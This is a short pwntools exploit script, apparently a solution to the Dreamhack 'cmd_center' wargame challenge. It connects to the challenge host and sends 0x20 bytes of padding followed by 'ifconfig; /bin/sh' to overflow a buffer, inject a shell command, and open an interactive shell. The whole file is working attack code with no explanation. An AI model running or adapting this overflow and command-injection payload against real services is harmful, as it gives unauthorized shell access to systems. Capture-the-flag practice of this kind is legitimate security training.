from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/cmd_center')
else:
    r = remote('host1.dreamhack.games', 23959)

r.sendafter('Center name: ', 'a' * 0x20 + 'ifconfig; /bin/sh')

r.interactive()